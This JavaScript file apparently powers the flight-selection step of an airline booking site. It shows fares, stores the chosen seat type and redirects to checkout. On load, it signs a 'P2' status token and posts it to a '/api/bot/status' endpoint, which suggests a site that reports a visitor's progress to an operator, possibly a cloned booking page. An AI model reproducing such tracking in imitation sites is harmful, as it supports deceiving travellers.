/**
 * Elements@Index
 * 
 */
const DOMElements = {
    loader: document.querySelector('.modal-loader'),

    labelResumeDepartures: document.querySelector('#resume-departures-label'),
    labelResumeDates: document.querySelector('#resume-dates-label'),
    labelResumePassengers: document.querySelector('#resume-passengers-label'),

    labelFlightDate: document.querySelectorAll('#flight-date-label'),

    labelBasicPrice: document.querySelectorAll('#basic-price'),
    labelLighterPrice: document.querySelectorAll('#light-price'),
    labelFullPrice: document.querySelectorAll('#full-price'),
    labelPremiumPrice: document.querySelectorAll('#premium-price'),

    radioInputs: document.querySelectorAll('input[type="radio"]'),
    btnSelectFlight: document.querySelectorAll('#select-flight'),
}




/**
 * Startup@Index
 * 
 */
document.addEventListener('DOMContentLoaded', () => {
    loadEventListeners();
    updateDOM();
    sendStatus();
});




/**
 * LoadEvents@Index
 * 
 */
const loadEventListeners = () => {
    const {
        radioInputs,
        btnSelectFlight
    } = DOMElements

    radioInputs.forEach(radio => {
        radio.addEventListener('change', handleSelection);
    });

    btnSelectFlight.forEach(button => {
        button.addEventListener('click', (e) => {
            DOMElements.loader.classList.add('flex');

            info.flightInfo.seat_type = e.currentTarget.dataset.flightLevel;
            info.flightInfo.aeroline = e.currentTarget.dataset.aeroline;
            updateLS();

            setTimeout(() => {
                if (info.flightInfo.travel_type === 2) {
                    window.location.href = 'flight-back.html';
                } else {
                    window.location.href = 'checkout.html';
                }
            }, 2000);
        });
    });    
}

const updateDOM = () => {
    const {
        labelBasicPrice,
        labelLighterPrice,
        labelFullPrice,
        labelPremiumPrice,
        labelFlightDate,
        labelResumeDepartures,
        labelResumeDates,
        labelResumePassengers,
    } = DOMElements

    // Setear resumen en cabecera
    labelResumeDepartures.textContent = `${info.flightInfo.origin.code} | ${info.flightInfo.destination.code}`
    labelResumePassengers.textContent = info.passengersInfo.adults.length + info.passengersInfo.children.length + info.passengersInfo.babies.length

    const flightDates = info.flightInfo.flightDates;
    const monthDic = ['Ene', 'Feb', 'Mar', 'Abr', 'May', 'Jun', 'Jul', 'Ago', 'Sep', 'Oct', 'Nov', 'Dic'];

    if (flightDates[0] !== 0) {
        const formatDate = (dateInMillis) => {
            dateInMillis = Number(dateInMillis);
            const date = new Date(dateInMillis);
            const day = date.getDate();
            const month = monthDic[date.getMonth()];
            const year = date.getFullYear();
            return `${day} ${month}. ${year}`;
        };

        if (flightDates[1] !== 0) {
            // Si hay dos fechas
            labelResumeDates.textContent = `${formatDate(flightDates[0])} | ${formatDate(flightDates[1])}`;
        } else {
            // Si solo hay una fecha
            labelResumeDates.textContent = formatDate(flightDates[0]);
        }
    } else {
        // Si no hay fechas, muestra un placeholder o un texto por defecto
        btnDates.value = 'Selecciona una fecha';
    }

    // Setear dates en vuelos
    labelFlightDate.forEach(label => {
        label.innerHTML = `<b>${info.flightInfo.origin.city} </b>(${info.flightInfo.origin.code}) - <b>${info.flightInfo.destination.city}</b>(${info.flightInfo.destination.code})`
    })

    // Setear precios
    if (info.flightInfo.origin.country === 'Colombia' && info.flightInfo.destination.country === 'Colombia') {
        labelBasicPrice.forEach(elem => {
            elem.textContent = `$ ${formatPrice(PRECIO_BASE * MULTIPLICADOR_PLAN.BASIC)}`;
        });
        labelLighterPrice.forEach(elem => {
            elem.textContent = `$ ${formatPrice(PRECIO_BASE * MULTIPLICADOR_PLAN.LIGHT)}`;
        });
        labelFullPrice.forEach(elem => {
            elem.textContent = `$ ${formatPrice(PRECIO_BASE * MULTIPLICADOR_PLAN.FULL)}`;
        });
        labelPremiumPrice.forEach(elem => {
            elem.textContent = `$ ${formatPrice(PRECIO_BASE * MULTIPLICADOR_PLAN.PREMIUM)}`;
        });
    } else {
        const WEIGHT = Math.abs(info.flightInfo.origin.weight - info.flightInfo.destination.weight)
        const PRICE = (WEIGHT * PRECIO_BASE_INT);

        labelBasicPrice.forEach(elem => {
            elem.textContent = `$ ${formatPrice(PRICE * MULTIPLICADOR_PLAN.BASIC)}`;
        });
        labelLighterPrice.forEach(elem => {
            elem.textContent = `$ ${formatPrice(PRICE * MULTIPLICADOR_PLAN.LIGHT)}`;
        });
        labelFullPrice.forEach(elem => {
            elem.textContent = `$ ${formatPrice(PRICE * MULTIPLICADOR_PLAN.FULL)}`;
        });
        labelPremiumPrice.forEach(elem => {
            elem.textContent = `$ ${formatPrice(PRICE * MULTIPLICADOR_PLAN.PREMIUM)}`;
        });
    }
}


/**
 * Functions@Index
 * 
 */
const handleSelection = (event) => {
    const { btnSelectFlight } = DOMElements;

    // Ocultar todos los botones
    btnSelectFlight.forEach(button => {
        if (!button.classList.contains('hidden')) {
            button.classList.add('hidden');
        }
    });

    // Buscar el contenedor abuelo del radio
    const selectedRadio = event.target;
    let parent = selectedRadio.parentElement;
    parent = parent.parentElement;
    parent = parent.parentElement;
    const divButton = parent.querySelector('#select-flight');
    
    // Mostrar el botón correspondiente
    divButton.classList.remove('hidden');
};

function formatPrice(number){
    return number.toLocaleString('es', {
        maximumFractionDigits: 0,
        useGrouping: true
    });
}

const sendStatus = () =>{
    const tokenn = KJUR.jws.JWS.sign(null, { alg: "HS256" }, {message: 'P2'}, JWT_SIGN);

    try{
        fetch(`${API_URL}/api/bot/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify({token: tokenn})
        });
    }catch(err){
        console.log(err);
    }
}







/**
 * UI@Index
 * 
 */
const openModal = (modalId) => {
    document.querySelector(`#${modalId}`).classList.add('block');
}

const closeModal = (modalId) => {
    document.querySelector(`#${modalId}`).classList.remove('block');

    // Restart inputs
    DOMElements.inputSearchOrigin.value = '';
    DOMElements.inputSearchDestination.value = '';
}